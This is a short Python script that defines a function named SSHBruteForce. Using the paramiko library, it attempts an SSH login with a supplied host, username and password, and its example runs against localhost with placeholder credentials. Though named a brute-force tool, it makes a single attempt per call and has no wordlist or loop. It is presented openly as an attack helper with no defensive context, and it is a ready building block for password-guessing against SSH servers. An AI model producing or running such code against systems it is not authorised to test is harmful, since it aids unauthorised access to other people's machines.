import paramiko

def SSHBruteForce(host, username, password):
    """
    Attempt to brute force SSH login using the provided credentials.
    
    :param host: The target host IP address or hostname.
    :param username: The SSH username to attempt.
    :param password: The SSH password to attempt.
    :return: True if login is successful, False otherwise.
    """
    try:
        # Create an SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Attempt to connect
        ssh.connect(host, username=username, password=password)
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            print(f"SSH session opened with {username}:{password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Login failed with {username}:{password}")
        return False
    except Exception as e:
        print(f"Error occurred: {e}")
        return False
    finally:
        ssh.close()

if __name__ == "__main__":
    # Example usage
    host = "127.0.0.1"
    username = "testuser"
    password = "testpassword"
    SSHBruteForce(host, username, password)